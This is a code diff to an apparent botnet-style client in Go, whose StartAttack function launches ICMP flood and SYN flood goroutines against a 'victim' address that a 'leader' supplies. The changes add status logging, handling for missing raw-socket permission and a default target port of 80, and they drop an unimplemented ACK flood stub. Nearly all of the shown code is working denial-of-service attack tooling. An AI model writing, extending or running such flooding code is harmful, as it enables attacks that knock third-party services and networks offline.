@@ -1,8 +1,6 @@
 package client
 
 import (
-	"fmt"
-	"github.com/fatih/color"
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
 	"net"
@@ -17,9 +15,7 @@ func StartAttack(victim string, ddosType string, stopchan chan bool, logChan cha
 		ip := strings.Split(victim, ":")[0]
 		go ICMPFlood(ip, stopchan, logChan)
 	} else if ddosType == "SYN" {
-		go SYNFlood(victim, stopchan)
-	} else if ddosType == "ACK" {
-		go ACKFlood(victim)
+		go SYNFlood(victim, stopchan, logChan)
 	}
 }
 func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
@@ -31,8 +27,10 @@ func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 	// open a connection to the server
 	conn, err := net.DialIP("ip4:icmp", nil, ipAddr)
 	if err != nil {
-		color.Red("Error Dialing : %s", err)
-		return
+		if strings.Contains(err.Error(), "permitted") {
+			logChan <- "You don't have permission\n to send ICMP packets"
+			return
+		}
 	}
 	defer conn.Close()
 
@@ -41,7 +39,7 @@ func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 		select {
 		case isStop := <-stopChan:
 			if isStop {
-				logChan <- "Stopping attack"
+				logChan <- "Stopping the attack"
 				stopChan <- false
 				return
 			}
@@ -57,6 +55,7 @@ func ICMPFlood(victim string, stopChan chan bool, logChan chan string) {
 							blocked = true
 							//wait for 1 second
 							time.Sleep(1 * time.Second)
+							logChan <- "freezing, your network\n buffer is full"
 							blocked = false
 						}
 					}
@@ -96,15 +95,24 @@ func SendICMP(message *icmp.Message, conn *net.IPConn) error {
 	return nil
 }
 
-func SYNFlood(victim string, stop chan bool) {
+func SYNFlood(victim string, stopChan chan bool, logChan chan string) {
 	var maxChannelsNb = 20
 	var channels = make(chan struct{}, maxChannelsNb)
+	//check if port is specified
+	if !strings.Contains(victim, ":") {
+		victim = victim + ":80"
+		logChan <- "leader does not specify port\n using port 80"
+	}
+
 	for {
 		channels <- struct{}{}
 		select {
-		case <-stop:
-			<-stop
-			return
+		case isStop := <-stopChan:
+			if isStop {
+				logChan <- "Stopping attack"
+				stopChan <- false
+				return
+			}
 		default:
 			go func() {
 				conn, err := net.Dial("tcp", victim)
@@ -116,14 +124,10 @@ func SYNFlood(victim string, stop chan bool) {
 					}
 				}
 				if err != nil {
-					fmt.Println("Error:", err)
+					logChan <- "error sending SYN flood request"
 				}
 				<-channels
 			}()
 		}
 	}
-}
-
-func ACKFlood(server string) {
-	//SOON
 }
